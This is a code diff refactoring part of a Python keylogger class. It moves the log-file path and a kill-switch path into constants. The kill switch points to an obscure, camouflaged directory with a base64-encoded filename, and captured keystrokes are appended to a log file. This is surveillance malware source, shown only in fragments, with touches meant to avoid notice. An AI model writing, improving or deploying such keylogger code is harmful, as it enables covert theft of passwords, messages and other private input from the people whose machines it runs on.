@@ -5,11 +5,21 @@ from datetime import datetime
 import os, sys
 from pathlib import Path
 
+
+# STATIC INPUTS
+# kill switch
+K_SWITCH_PATH = "./C/Files/Explorer/Foreign/Figma/aW52YWxpZEZpbGU="
+
+# logs file
+LOGGER_PATH = Path("./Logs/my_log.txt")
+LOGGER_PATH.parent.mkdir(parents=True, exist_ok=True)
+
+
 class KeyLogger:
     def __init__(self) -> None:
         self.log = ""
         self.start_date = datetime.now()
-        self.stop_file_path = Path("./C/Files/Explorer/Foreign/Figma/aW52YWxpZEZpbGU=")
+        self.stop_file_path = Path(K_SWITCH_PATH)
         self.K_Listener = None
         self.M_Listener = None
         self.pressed_keys = set() # holding keys for complex combos
@@ -89,7 +99,7 @@ class KeyLogger:
     # -------------------------------------------
     # writing it to a output file
     def report(self):
-        with open("./logs/log.txt", "a") as log:
+        with LOGGER_PATH.open("a") as log:
             log.write(self.log)
         self.log = ""
         
